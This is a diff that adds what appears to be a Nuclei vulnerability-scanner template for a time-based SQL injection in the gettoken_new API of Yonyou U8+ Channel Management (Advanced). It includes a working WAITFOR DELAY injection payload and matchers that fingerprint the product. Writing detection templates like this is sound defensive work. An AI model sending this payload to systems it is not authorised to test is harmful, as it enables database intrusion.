@@ -1,0 +1,52 @@
+id: poc-yaml-yongyon-u8-cm-ae-gettoken-new-sqli
+info:
+  name: 用友U8+渠道管理(高级版) gettoken_new SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in 用友U8+渠道管理(高级版) at the /api/gettoken_new endpoint.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-indexbusiness
+    method: GET
+    path:
+      - "{{BaseURL}}/indexbusiness.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "渠道管理（高级版）"
+
+  - id: sqli-test
+    method: GET
+    path:
+      - "{{BaseURL}}/api/gettoken_new?appid=%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--&appkey=1&appsecret=1&userid=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "注册信息不存在，请联系管理员"
+        negative: false
+      - type: regex
+        regex:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
